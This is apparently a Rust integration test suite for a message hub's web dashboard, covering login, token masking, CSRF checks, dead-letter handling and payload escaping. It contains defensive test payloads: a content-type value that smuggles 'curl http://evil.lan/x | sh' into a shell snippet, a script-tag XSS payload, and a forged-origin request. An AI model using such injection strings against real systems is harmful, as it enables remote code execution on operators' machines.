//! [K2] The dashboard on the kit (step 2 of the chassis migration,
//! 2026-09-06): the kit owns the door, the layout, the login and the
//! clients page; the hub keeps its pages and its API. Every test here goes
//! through the real `chassis::App` — what the binary runs — so the kit's
//! guarantees (login, CSRF, CSP) are exercised, not mocked.
//!
//! Ported from `l7_dashboard.rs`, `p7_auth.rs`, `p7_security.rs` (finding 1)
//! and the dashboard tests of `p7_hardening.rs`, which mounted the hub's
//! own router; those files carried the assertions, this file carries the
//! same assertions against the kit.

mod common;

use std::process::Command;

use common::{KEY, KitHub, TOKEN, body_json, header, spawn_kit, spawn_kit_in, unescape};
use kyu::events::EVENTS_TOPIC;

/// The visible text of one command snippet on a topic page, as a reader
/// would copy it: unescaped, the shell continuations joined.
fn snippet(page: &str, id: &str) -> String {
    let start = page
        .find(&format!("id=\"{id}\""))
        .unwrap_or_else(|| panic!("no snippet {id} on the page"));
    let rest = &page[start..];
    let text_start = rest
        .find("data-revealed=\"false\">")
        .expect("the snippet's text")
        + "data-revealed=\"false\">".len();
    let text_end = rest.find("</pre>").expect("the snippet closes");
    unescape(&rest[text_start..text_end])
        .replace("\\\n", " ")
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
}

async fn topic_page(hub: &KitHub, topic: &str) -> String {
    hub.page(&format!("/t/{topic}/dashboard")).await
}

// ─── the door ───────────────────────────────────────────────────────────────

#[tokio::test]
async fn k2_the_kit_owns_the_door() {
    let hub = spawn_kit().await;
    // A browser without a session is sent to the kit's login page.
    for path in [
        "/topics",
        "/t/notify.kenny/dashboard",
        "/apps",
        "/clients",
        "/",
    ] {
        let response = hub.get_anon(path).await;
        assert_eq!(response.status(), 303, "{path} needs a login");
        assert!(
            header(&response, "location")
                .unwrap_or_default()
                .ends_with("/login"),
            "{path} redirects to /login"
        );
    }
    // A script without a token gets a JSON refusal with a remedy.
    let refused = reqwest::Client::new()
        .post(hub.url("/t/notify.kenny"))
        .header("content-type", "application/json")
        .body("{}")
        .send()
        .await
        .expect("a response");
    assert_eq!(refused.status(), 401);
    let json = body_json(refused).await;
    assert!(
        json["remedy"].as_str().unwrap_or_default().len() > 20,
        "{json}"
    );
    // The login token works as a bearer for Kenny's scripts.
    assert_eq!(
        hub.publish_bytes("notify.kenny", "application/json", b"{}".to_vec())
            .await,
        201
    );
    // A wrong login token does not open a session.
    let wrong = reqwest::Client::builder()
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .unwrap()
        .post(hub.url("/login"))
        .header("content-type", "application/x-www-form-urlencoded")
        .body("token=not-the-token-at-all-really")
        .send()
        .await
        .expect("a response");
    assert!(
        header(&wrong, "set-cookie").is_none(),
        "no session for a wrong token"
    );
    // The 2.x apps page keeps its address: it is the kit's clients page now.
    let apps = hub.get("/apps").await;
    assert_eq!(apps.status(), 303);
    assert!(
        header(&apps, "location")
            .unwrap_or_default()
            .ends_with("/clients")
    );
    let clients = hub.page("/clients").await;
    assert!(
        clients.contains("<h1>Apps</h1>"),
        "the clients page keeps the hub's word for them"
    );
    hub.shutdown().await;
}

#[tokio::test]
async fn k2_check_refuses_to_start_without_a_token() {
    // W2, amended 2026-09-06: the hub no longer starts open. The kit refuses
    // at --check with the two variables by name, so a systemd unit that lost
    // its env file fails its ExecStartPre instead of serving an open hub.
    let dir = tempfile::tempdir().unwrap();
    let out = Command::new(env!("CARGO_BIN_EXE_kyu"))
        .args(["--check"])
        .env_clear()
        .env("KYU_STATE_DIR", dir.path())
        .env("KYU_LISTEN", "127.0.0.1:59998")
        .output()
        .unwrap();
    assert_eq!(
        out.status.code(),
        Some(1),
        "an open hub is not a valid configuration"
    );
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(
        text.contains("KYU_TOKEN") && text.contains("KYU_SECRET_KEY"),
        "{text}"
    );
}

#[tokio::test]
async fn k2_app_tokens_issued_by_2x_keep_working_after_the_import() {
    // K2-1: the tokens 2.x issued live in the `apps` table; 3.0.0 copies
    // them into the kit's store on first start, unchanged, so kyu-runner and
    // newsflash keep their environment files.
    let dir = tempfile::tempdir().unwrap();
    let old_token = {
        let store = std::sync::Arc::new(kyu::store::Store::open(dir.path()).unwrap());
        let engine =
            kyu::engine::Engine::new(store, std::sync::Arc::new(kyu::engine::clock::SystemClock));
        let key = kyu::crypto::SecretKey::parse_hex(KEY).unwrap();
        let app = engine.register_app("printer", &key).expect("an app");
        let _retired = engine.register_app("retired", &key).expect("another app");
        engine.revoke_app("retired").expect("revoked");
        app.token
    };
    let hub = spawn_kit_in(dir).await;
    let response = hub
        .publish_as(
            &old_token,
            "print.receipt",
            "application/json",
            b"{}".to_vec(),
        )
        .await;
    assert_eq!(
        response.status(),
        201,
        "the 2.x token publishes on 3.0.0 unchanged"
    );
    let clients = hub.page("/clients").await;
    assert!(
        clients.contains("printer"),
        "the imported app is on the Apps page: {clients}"
    );
    assert!(
        !clients.contains("retired"),
        "a revoked 2.x app is not brought back"
    );
    assert!(
        !clients.contains(&old_token),
        "the token never appears in the page HTML"
    );
    // The import happened once: the kit's file exists and a restart on the
    // same directory does not duplicate anything.
    assert!(
        hub.store
            .path()
            .unwrap()
            .parent()
            .unwrap()
            .join("clients.json.enc")
            .exists()
    );
    hub.shutdown().await;
}

#[tokio::test]
async fn k2_no_login_token_leaks_into_metrics_or_the_topic_list() {
    let hub = spawn_kit().await;
    hub.publish("notify.kenny", "{}").await;
    let metrics = hub.get_anon("/metrics").await.text().await.unwrap();
    assert!(!metrics.contains(TOKEN));
    let topics = hub.page("/topics").await;
    assert!(
        !topics.contains(TOKEN),
        "the list page prints no command with a token"
    );
    hub.shutdown().await;
}

// ─── the pages ──────────────────────────────────────────────────────────────

#[tokio::test]
async fn k2_the_topics_page_lists_every_topic_and_the_status_page_counts_them() {
    let hub = spawn_kit().await;
    hub.publish("notify.kenny", "{}").await;
    hub.bootstrap("notify.kenny", "printer").await;
    hub.publish("notify.kenny", "{}").await;
    hub.publish("jobs.transcode", "{}").await;
    let body = hub.page("/topics").await;
    assert!(body.contains("notify.kenny") && body.contains("jobs.transcode"));
    assert!(
        body.contains(EVENTS_TOPIC),
        "the hub's own event topic is a topic like any other"
    );
    assert!(
        body.contains("/t/notify.kenny/dashboard"),
        "and links to it"
    );
    assert!(
        body.contains("class=\"explain\""),
        "every page opens by saying what it is"
    );
    assert!(body.contains("kp-nav"), "inside the kit's layout");
    assert!(
        body.contains("/assets/kyu.css?v="),
        "with the hub's own styles, fingerprinted"
    );
    let shown = unescape(&body);
    assert!(
        shown.contains("Start a topic") && shown.contains("curl"),
        "the page always shows how to publish"
    );
    // The kit's status page carries the counts and the way in.
    let status = hub.page("/").await;
    assert!(
        status.contains("Topics")
            && status.contains("Dead letters")
            && status.contains("Open the topics"),
        "{status}"
    );
    hub.shutdown().await;
}

#[tokio::test]
async fn k2_the_topic_page_shows_subscriptions_backlogs_and_policy() {
    let hub = spawn_kit().await;
    hub.publish("notify.kenny", "{}").await;
    hub.bootstrap("notify.kenny", "printer").await;
    hub.bootstrap("notify.kenny", "ha-forwarder").await;
    hub.bearer(
        reqwest::Method::PUT,
        "/api/t/notify.kenny/subs/ha-forwarder/policy",
        TOKEN,
    )
    .body(r#"{"ttl_ms":600000}"#)
    .send()
    .await
    .expect("a policy");
    hub.publish("notify.kenny", r#"{"title":"Backup klaar"}"#)
        .await;
    let body = topic_page(&hub, "notify.kenny").await;
    assert!(body.contains("printer") && body.contains("ha-forwarder"));
    assert!(body.contains("active"), "states are shown");
    assert!(body.contains("(default)"), "a default value says so");
    assert!(body.contains("ttl 600000ms"), "an explicit policy is shown");
    assert!(body.contains("Backup klaar"), "recent payloads are visible");
    assert!(
        body.contains("Lapsed"),
        "AR3: lapsed is counted and visible"
    );
    assert!(
        body.contains("Reveal") && body.contains("snippet-publish"),
        "the commands are there, masked"
    );
    hub.shutdown().await;
}

#[tokio::test]
async fn k2_a_payload_cannot_script_the_dashboard() {
    let hub = spawn_kit().await;
    hub.publish(
        "notify.kenny",
        r#"{"title":"<script>alert('pwned')</script>"}"#,
    )
    .await;
    let body = topic_page(&hub, "notify.kenny").await;
    assert!(
        !body.contains("<script>alert"),
        "an unescaped payload would make every consumer a way in"
    );
    assert!(
        body.contains("&lt;script&gt;"),
        "it must still be readable, just inert"
    );
    hub.shutdown().await;
}

#[tokio::test]
async fn k2_binary_and_oversized_payloads_are_marked_not_mangled() {
    let hub = spawn_kit().await;
    assert_eq!(
        hub.publish_bytes(
            "print.receipt",
            "application/octet-stream",
            vec![0x00, 0xff, 0x1b, 0x80]
        )
        .await,
        201
    );
    assert_eq!(
        hub.publish_bytes("print.receipt", "text/plain", "x".repeat(9000).into_bytes())
            .await,
        201
    );
    let body = topic_page(&hub, "print.receipt").await;
    assert!(
        body.contains("binary payload (4 bytes)"),
        "binary is announced with its size"
    );
    assert!(
        body.contains("showing the first 4096 of 9000 bytes"),
        "truncation is never silent"
    );
    hub.shutdown().await;
}

#[tokio::test]
async fn k2_a_topic_nobody_polls_explains_the_bootstrap_order() {
    let hub = spawn_kit().await;
    hub.publish("notify.kenny", "{}").await;
    let body = topic_page(&hub, "notify.kenny").await;
    assert!(
        body.contains("first polls"),
        "the G7 trap is the one thing a newcomer must be told"
    );
    assert!(body.contains("from=beginning"));
    hub.shutdown().await;
}

#[tokio::test]
async fn k2_an_unknown_topic_or_subscription_answers_404_with_a_remedy() {
    let hub = spawn_kit().await;
    let response = hub.get("/t/nope.nothing/dashboard").await;
    assert_eq!(response.status(), 404);
    let json = body_json(response).await;
    assert!(
        json["remedy"]
            .as_str()
            .unwrap_or_default()
            .contains("/topics"),
        "{json}"
    );
    hub.publish("print.receipt", "{}").await;
    assert_eq!(
        hub.get("/t/print.receipt/dashboard/subs/nobody")
            .await
            .status(),
        404
    );
    hub.shutdown().await;
}

#[tokio::test]
async fn k2_the_test_publish_form_puts_a_real_message_on_the_topic() {
    let hub = spawn_kit().await;
    hub.publish("notify.kenny", "{}").await;
    hub.bootstrap("notify.kenny", "printer").await;
    let response = hub
        .form(
            "/t/notify.kenny/dashboard/publish",
            "payload=%7B%22from%22%3A%22dashboard%22%7D",
        )
        .await;
    assert!(
        response.status().is_redirection(),
        "the form posts and returns to the page: {}",
        response.status()
    );
    let received = hub.receive("notify.kenny", "as=printer&wait=0").await;
    assert_eq!(received.status(), 200);
    assert_eq!(
        received.text().await.unwrap(),
        r#"{"from":"dashboard"}"#,
        "W9: one click answers 'producer or consumer?'"
    );
    // The same form from a foreign origin is refused by the kit (SEC2).
    let hostile = reqwest::Client::new()
        .post(hub.url("/t/notify.kenny/dashboard/publish"))
        .header("cookie", &hub.cookie)
        .header("origin", "http://evil.example")
        .header("content-type", "application/x-www-form-urlencoded")
        .body("payload=%7B%7D")
        .send()
        .await
        .expect("a response");
    assert_eq!(hostile.status(), 403);
    hub.shutdown().await;
}

#[tokio::test]
async fn k2_the_snippets_the_dashboard_prints_actually_work() {
    let hub = spawn_kit().await;
    hub.publish("notify.kenny", "{}").await;
    hub.bootstrap("notify.kenny", "printer").await;
    hub.publish("notify.kenny", r#"{"title":"Backup klaar"}"#)
        .await;
    // Read the page the way a browser shows it, then run what it printed
    // (S1: the example is the hub describing itself).
    let body = topic_page(&hub, "notify.kenny").await;
    let receive = snippet(&body, "snippet-receive-envelope");
    assert!(
        receive.starts_with("curl") && receive.contains("envelope=json"),
        "{receive}"
    );
    assert!(
        receive.contains("as=printer"),
        "the snippet names a subscription that exists: {receive}"
    );
    assert!(
        receive.contains("authorization: Bearer ••••"),
        "the token is masked on screen: {receive}"
    );
    let path = receive
        .split('"')
        .nth(1)
        .expect("the snippet quotes its URL");
    let response = hub
        .bearer(reqwest::Method::GET, path, TOKEN)
        .send()
        .await
        .expect("the snippet must run");
    assert_eq!(
        response.status(),
        200,
        "the command the dashboard printed must return a message: {path}"
    );
    let envelope = body_json(response).await;
    assert_eq!(envelope["payload"]["title"], "Backup klaar");
    hub.shutdown().await;
}

#[tokio::test]
async fn k2_a_hostile_content_type_cannot_escape_the_dashboard_snippet() {
    // Security finding 1: the content type is attacker-controlled and the
    // dashboard prints it inside a shell command the operator pastes.
    let hub = spawn_kit().await;
    let hostile = "application/json' ; curl http://evil.lan/x | sh ; echo '";
    assert_eq!(
        hub.publish_bytes("notify.kenny", hostile, br#"{"n":1}"#.to_vec())
            .await,
        201
    );
    let publish = snippet(&topic_page(&hub, "notify.kenny").await, "snippet-publish");
    assert!(
        !publish.contains("evil.lan"),
        "an injection reached the clipboard: {publish}"
    );
    assert!(
        publish.contains("content-type: application/json"),
        "and the snippet still shows a usable content type: {publish}"
    );
    hub.shutdown().await;
}

#[tokio::test]
async fn k2_the_awkward_dashboard_states_all_render() {
    let hub = spawn_kit().await;
    // A delayed message, so the due-at branch is reached.
    let delayed = hub
        .bearer(
            reqwest::Method::POST,
            "/t/notify.kenny?delay=3600000",
            TOKEN,
        )
        .header("content-type", "application/json")
        .body(r#"{"later":true}"#)
        .send()
        .await
        .expect("a delayed publish");
    assert_eq!(delayed.status(), 201);
    // An archived subscription, so the snippet has no live name to use.
    hub.bootstrap("notify.kenny", "retired").await;
    hub.store.with_conn(|conn| {
        conn.execute(
            "UPDATE subscriptions SET state = 'archived' WHERE name = 'retired'",
            [],
        )
        .expect("archive")
    });
    let body = topic_page(&hub, "notify.kenny").await;
    assert!(body.contains("archived"));
    assert!(
        body.contains("due"),
        "the delayed message shows its due time"
    );
    assert_eq!(
        hub.get(&format!("/t/{EVENTS_TOPIC}/dashboard"))
            .await
            .status(),
        200,
        "the events topic has a page like any other"
    );
    hub.shutdown().await;
}

// ─── dead letters and backlogs (K6, W15, W16, P1) ───────────────────────────

#[tokio::test]
async fn k2_the_dashboard_shows_dead_letters_and_requeues_them() {
    let hub = spawn_kit().await;
    hub.bootstrap("print.receipt", "printer").await;
    let id = hub.publish("print.receipt", r#"{"receipt":"kapot"}"#).await;
    assert_eq!(
        hub.receive("print.receipt", "as=printer&wait=0")
            .await
            .status(),
        200
    );
    assert_eq!(
        hub.post_api(&format!("/t/print.receipt/nack/{id}?as=printer&dead=true"))
            .await
            .status(),
        200
    );
    let page = topic_page(&hub, "print.receipt").await;
    assert!(page.contains("Dead letters") && page.contains(&id) && page.contains("printer"));
    assert!(
        page.contains("kapot"),
        "and the payload, the whole point of looking"
    );
    assert!(page.contains("Requeue"));
    let requeued = hub
        .form(
            "/t/print.receipt/dashboard/requeue",
            &format!("subscription=printer&id={id}"),
        )
        .await;
    assert!(
        requeued.status().is_redirection(),
        "the requeue button returns to the page"
    );
    let redelivered = hub.receive("print.receipt", "as=printer&wait=0").await;
    assert_eq!(redelivered.status(), 200);
    assert_eq!(
        header(&redelivered, "kyu-attempt").as_deref(),
        Some("1"),
        "a requeued message starts its attempts over"
    );
    let after = topic_page(&hub, "print.receipt").await;
    assert!(
        after.contains("Nothing has been dead-lettered"),
        "the list empties once dealt with"
    );
    hub.shutdown().await;
}

#[tokio::test]
async fn k2_the_dead_letter_delete_button_removes_only_this_subscriptions_copy() {
    let hub = spawn_kit().await;
    hub.bootstrap_two_clean("print.receipt", "printer", "archiver")
        .await;
    let id = hub.publish("print.receipt", r#"{"receipt":"kapot"}"#).await;
    let received = hub.receive("print.receipt", "as=printer&wait=0").await;
    assert_eq!(received.status(), 200);
    assert_eq!(header(&received, "kyu-id").as_deref(), Some(id.as_str()));
    assert_eq!(
        hub.post_api(&format!("/t/print.receipt/nack/{id}?as=printer&dead=true"))
            .await
            .status(),
        200
    );
    let page = topic_page(&hub, "print.receipt").await;
    assert!(page.contains("Delete"), "the button exists beside Requeue");
    assert!(
        page.contains("data-kp-destructive") && page.contains("data-kp-confirm"),
        "and it arms before it acts"
    );
    let deleted = hub
        .form(
            "/t/print.receipt/dashboard/delivery/delete",
            &format!("subscription=printer&id={id}"),
        )
        .await;
    assert!(deleted.status().is_redirection());
    let after = topic_page(&hub, "print.receipt").await;
    assert!(after.contains("Nothing has been dead-lettered"));
    let for_archiver = hub.receive("print.receipt", "as=archiver&wait=0").await;
    assert_eq!(
        for_archiver.status(),
        200,
        "the other subscription's copy survives"
    );
    assert_eq!(
        header(&for_archiver, "kyu-id").as_deref(),
        Some(id.as_str())
    );
    let again = hub
        .post_api(&format!(
            "/api/t/print.receipt/subs/printer/deliveries/{id}/delete"
        ))
        .await;
    assert_eq!(
        again.status(),
        404,
        "deleting an already-gone delivery says so plainly"
    );
    hub.shutdown().await;
}

#[tokio::test]
async fn k2_a_subscription_page_lists_its_own_backlog_and_deleting_spares_the_rest() {
    let hub = spawn_kit().await;
    hub.bootstrap_two_clean("print.receipt", "printer", "archiver")
        .await;
    let id = hub
        .publish("print.receipt", r#"{"receipt":"nog te doen"}"#)
        .await;
    let topic = topic_page(&hub, "print.receipt").await;
    assert!(
        topic.contains("/t/print.receipt/dashboard/subs/printer"),
        "the subscription name links to its own page"
    );
    let page = hub.page("/t/print.receipt/dashboard/subs/printer").await;
    assert!(page.contains(&id) && page.contains("nog te doen") && page.contains("Delete"));
    let archiver = hub.page("/t/print.receipt/dashboard/subs/archiver").await;
    assert!(
        archiver.contains(&id),
        "archiver's own pending copy shows on its own page"
    );
    let deleted = hub
        .form(
            "/t/print.receipt/dashboard/delivery/delete",
            &format!("subscription=printer&id={id}"),
        )
        .await;
    assert!(deleted.status().is_redirection());
    let after = hub.page("/t/print.receipt/dashboard/subs/printer").await;
    assert!(
        after.contains("Nothing pending or claimed"),
        "printer's backlog is empty now"
    );
    let for_archiver = hub.receive("print.receipt", "as=archiver&wait=0").await;
    assert_eq!(
        for_archiver.status(),
        200,
        "archiver's copy was never touched"
    );
    assert_eq!(
        header(&for_archiver, "kyu-id").as_deref(),
        Some(id.as_str())
    );
    hub.shutdown().await;
}

#[tokio::test]
async fn k2_a_binary_dead_letter_is_announced_not_mangled() {
    let hub = spawn_kit().await;
    hub.bootstrap("print.receipt", "printer").await;
    assert_eq!(
        hub.publish_bytes(
            "print.receipt",
            "application/octet-stream",
            vec![0x00, 0xff, 0x1b, 0x80]
        )
        .await,
        201
    );
    let received = hub.receive("print.receipt", "as=printer&wait=0").await;
    let id = header(&received, "kyu-id").expect("an id");
    let _ = hub
        .post_api(&format!("/t/print.receipt/nack/{id}?as=printer&dead=true"))
        .await;
    let page = topic_page(&hub, "print.receipt").await;
    assert!(
        page.contains("binary payload (4 bytes)"),
        "a dead letter you cannot read still says what it is"
    );
    hub.shutdown().await;
}

// ─── the hub's own assets ───────────────────────────────────────────────────

#[tokio::test]
async fn k2_the_hub_assets_are_served_open_and_fingerprinted() {
    let hub = spawn_kit().await;
    let css = hub.get_anon("/assets/kyu.css").await;
    assert_eq!(css.status(), 200);
    assert!(
        header(&css, "content-type")
            .unwrap_or_default()
            .starts_with("text/css")
    );
    assert!(
        header(&css, "cache-control")
            .unwrap_or_default()
            .contains("immutable")
    );
    let js = hub.get_anon("/assets/app.js").await;
    assert_eq!(js.status(), 200);
    assert_eq!(hub.get_anon("/assets/nope.js").await.status(), 404);
    let page = hub.page("/topics").await;
    assert!(page.contains("/assets/app.js?v=") && page.contains("/assets/kyu.css?v="));
    // The kit's own assets are there too: the pages depend on them.
    assert_eq!(hub.get_anon("/static/themes.css").await.status(), 200);
    hub.shutdown().await;
}
